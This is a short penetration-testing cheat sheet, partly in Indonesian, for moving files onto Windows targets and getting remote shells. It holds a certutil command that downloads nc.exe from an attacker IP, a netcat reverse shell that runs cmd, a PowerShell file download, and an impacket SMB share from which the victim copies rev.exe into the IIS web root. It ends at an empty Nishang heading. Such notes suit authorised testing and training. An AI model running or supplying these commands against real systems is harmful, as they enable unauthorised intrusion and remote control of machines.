# Download and Upload

## Download File From CMD (Not PowerShell) -- 
certutil.exe -urlcache -split -f "http://10.14.17.16:4545/nc.exe" %tmp%\nc.exe

### Reverse Shell
%tmp%\nc.exe IP PORT -e cmd

## Download File From PowerShell) -- 

(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  

## Download File From SMB
### Attacker
```
impacket-smbserver drop $(pwd) -smb2support
```

`drop` adalah nama direktori yang akan di share

### Client victim
```
copy \\10.10.14.3\drop\rev.exe c:\Inetpub\wwwroot\rev.exe
```

## Reverse Shell With Nishang To Get Powershell --